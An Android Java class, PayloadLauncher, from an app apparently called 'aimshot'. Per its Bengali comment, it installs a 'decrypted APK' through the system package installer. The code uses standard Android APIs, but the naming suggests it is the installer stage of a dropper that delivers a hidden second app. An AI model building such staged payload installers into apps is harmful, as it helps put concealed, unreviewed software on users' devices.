// File: PayloadLauncher.java
package com.alpha10.aimshot;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import androidx.core.content.FileProvider;
import java.io.File;

public class PayloadLauncher {

    // ডিক্রিপ্ট করা APK ফাইলটি ইনস্টল করার মেথড
    public static void installPayload(Context context, File apkFile) {
        if (apkFile == null || !apkFile.exists()) {
            return;
        }

        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        Uri apkUri;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            apkUri = FileProvider.getUriForFile(
                context, 
                context.getPackageName() + ".fileprovider", 
                apkFile
            );
            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        } else {
            apkUri = Uri.fromFile(apkFile);
        }

        intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
        context.startActivity(intent);
    }
}
